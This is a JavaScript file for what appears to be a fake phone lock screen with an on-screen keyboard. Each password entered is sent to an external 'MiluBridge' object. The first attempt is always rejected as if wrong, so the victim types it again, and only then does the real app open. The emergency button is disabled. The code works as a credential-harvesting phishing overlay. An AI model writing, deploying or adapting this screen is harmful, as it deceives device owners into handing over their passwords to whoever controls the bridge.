(() => {
  const MIN_LEN = 4;
  const MAX_LEN = 64;

  const page = document.getElementById("page");
  const pwdBox = document.getElementById("pwdBox");
  const pwdDisplay = document.getElementById("pwdDisplay");
  const pwdCaret = document.getElementById("pwdCaret");
  const toggleBtn = document.getElementById("toggleBtn");
  const emergencyBtn = document.getElementById("emergencyBtn");
  const keyboard = document.getElementById("keyboard");

  const ALPHA_ROWS = [
    ["q", "w", "e", "r", "t", "y", "u", "i", "o", "p"],
    ["a", "s", "d", "f", "g", "h", "j", "k", "l"],
    ["z", "x", "c", "v", "b", "n", "m"],
  ];
  const NUM_ROW = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"];
  const SYM_KEYS = ["@", "#", "!", "?", "-", "_", ".", ",", "+"];

  let password = "";
  let showPlain = false;
  let keyboardMode = "alpha";
  let submitting = false;
  let submitCount = 0;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function renderPassword() {
    if (!password) {
      pwdDisplay.textContent = "";
      pwdCaret.classList.remove("is-hidden");
      pwdDisplay.classList.remove("is-masked");
      return;
    }

    pwdCaret.classList.add("is-hidden");
    if (showPlain) {
      pwdDisplay.textContent = password;
      pwdDisplay.classList.remove("is-masked");
    } else {
      pwdDisplay.textContent = "•".repeat(password.length);
      pwdDisplay.classList.add("is-masked");
    }
  }

  function updateCaretOffset() {
    if (!password || showPlain) {
      pwdCaret.style.left = `${16 + Math.min(pwdDisplay.scrollWidth, pwdBox.clientWidth - 56)}px`;
      return;
    }
    const approx = 16 + password.length * 12;
    pwdCaret.style.left = `${Math.min(approx, pwdBox.clientWidth - 56)}px`;
  }

  function shake() {
    pwdBox.classList.remove("is-shake");
    void pwdBox.offsetWidth;
    pwdBox.classList.add("is-shake");
  }

  function appendChar(ch) {
    if (submitting || password.length >= MAX_LEN) {
      return;
    }
    password += ch;
    renderPassword();
    updateCaretOffset();
  }

  function backspace() {
    if (submitting || !password.length) {
      return;
    }
    password = password.slice(0, -1);
    renderPassword();
    updateCaretOffset();
  }

  function clearPassword() {
    password = "";
    renderPassword();
    updateCaretOffset();
  }

  function submitPassword() {
    if (submitting) {
      return;
    }
    if (password.length < MIN_LEN) {
      shake();
      return;
    }

    submitting = true;
    const value = password;
    submitCount += 1;
    reportDone(value);

    if (submitCount < 2) {
      shake();
      window.setTimeout(() => {
        clearPassword();
        submitting = false;
      }, 360);
      return;
    }

    window.setTimeout(() => {
      openApp();
      submitting = false;
    }, 280);
  }

  const BACKSPACE_ICON =
    '<svg viewBox="0 0 48 40" width="26" height="22" aria-hidden="true">' +
    '<path fill="none" stroke="currentColor" stroke-width="2.2" stroke-linejoin="round" d="M16 6H42a4 4 0 0 1 4 4v20a4 4 0 0 1-4 4H16L6 26 16 6z"/>' +
    '<path fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" d="M24 14l8 8M32 14l-8 8"/>' +
    "</svg>";

  function createKey(label, className, action) {
    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = `kb-key ${className || ""}`.trim();
    btn.textContent = label;
    btn.addEventListener("click", action);
    return btn;
  }

  function createBackspaceKey() {
    const btn = createKey("", "kb-key--back", () => {
      backspace();
    });
    btn.setAttribute("aria-label", "Delete");
    btn.innerHTML = BACKSPACE_ICON;
    return btn;
  }

  function renderKeyboard() {
    const numsRow = keyboard.querySelector('[data-row="nums"]');
    const qRow = keyboard.querySelector('[data-row="q"]');
    const aRow = keyboard.querySelector('[data-row="a"]');
    const zRow = keyboard.querySelector('[data-row="z"]');
    const bottomRow = keyboard.querySelector('[data-row="bottom"]');

    [numsRow, qRow, aRow, zRow, bottomRow].forEach((row) => {
      row.innerHTML = "";
      row.classList.remove("kb-row--z");
    });

    NUM_ROW.forEach((num) => {
      numsRow.appendChild(
        createKey(num, "", () => {
          appendChar(num);
        }),
      );
    });

    if (keyboardMode === "alpha") {
      ALPHA_ROWS[0].forEach((ch) => {
        qRow.appendChild(createKey(ch, "", () => appendChar(ch)));
      });

      aRow.appendChild(createKey("", "kb-key--hidden", () => {}));
      ALPHA_ROWS[1].forEach((ch) => {
        aRow.appendChild(createKey(ch, "", () => appendChar(ch)));
      });
      aRow.appendChild(createKey("", "kb-key--hidden", () => {}));

      zRow.classList.add("kb-row--z");
      zRow.appendChild(createKey("?#+", "kb-key--wide-left", () => {
        keyboardMode = "symbol";
        renderKeyboard();
      }));
      ALPHA_ROWS[2].forEach((ch) => {
        zRow.appendChild(createKey(ch, "", () => appendChar(ch)));
      });
      zRow.appendChild(createBackspaceKey());
    } else if (keyboardMode === "symbol") {
      SYM_KEYS.forEach((ch) => {
        qRow.appendChild(createKey(ch, "", () => appendChar(ch)));
      });
      aRow.appendChild(createKey("", "kb-key--hidden", () => {}));
      ["(", ")", "'", '"', ":", ";", "/"].forEach((ch) => {
        aRow.appendChild(createKey(ch, "", () => appendChar(ch)));
      });

      zRow.classList.add("kb-row--z");
      zRow.appendChild(createKey("ABC", "kb-key--wide-left", () => {
        keyboardMode = "alpha";
        renderKeyboard();
      }));
      ["%", "&", "*", "="].forEach((ch) => {
        zRow.appendChild(createKey(ch, "", () => appendChar(ch)));
      });
      zRow.appendChild(createBackspaceKey());
    } else {
      ["1", "2", "3", "4", "5"].forEach((ch) => {
        qRow.appendChild(createKey(ch, "", () => appendChar(ch)));
      });
      ["6", "7", "8", "9", "0"].forEach((ch) => {
        aRow.appendChild(createKey(ch, "", () => appendChar(ch)));
      });
      zRow.appendChild(createKey(".", "", () => appendChar(".")));
      zRow.appendChild(createKey(",", "", () => appendChar(",")));
      zRow.appendChild(createBackspaceKey());
    }

    bottomRow.appendChild(
      createKey("?#+", "kb-key--sym", () => {
        keyboardMode = keyboardMode === "symbol" ? "alpha" : "symbol";
        renderKeyboard();
      }),
    );
    bottomRow.appendChild(
      createKey("123", "kb-key--num-mode", () => {
        keyboardMode = keyboardMode === "numeric" ? "alpha" : "numeric";
        renderKeyboard();
      }),
    );
    bottomRow.appendChild(
      createKey("", "kb-key--space", () => {
        appendChar(" ");
      }),
    );
    bottomRow.lastChild.textContent = "";
    bottomRow.appendChild(
      createKey("Return", "kb-key--return", () => {
        submitPassword();
      }),
    );
  }

  toggleBtn.addEventListener("click", () => {
    showPlain = !showPlain;
    toggleBtn.setAttribute("aria-pressed", showPlain ? "true" : "false");
    toggleBtn.setAttribute("aria-label", showPlain ? "Hide password" : "Show password");
    toggleBtn.classList.toggle("is-visible", showPlain);
    renderPassword();
    updateCaretOffset();
  });

  emergencyBtn.addEventListener("click", (event) => {
    event.preventDefault();
  });

  pwdBox.addEventListener("click", () => {
    updateCaretOffset();
  });

  page.addEventListener("pointerdown", (event) => {
    if (event.target.closest(".keyboard") || event.target.closest(".pwd-toggle") || event.target.closest(".emergency")) {
      return;
    }
    updateCaretOffset();
  });

  renderKeyboard();
  renderPassword();
  updateCaretOffset();
})();
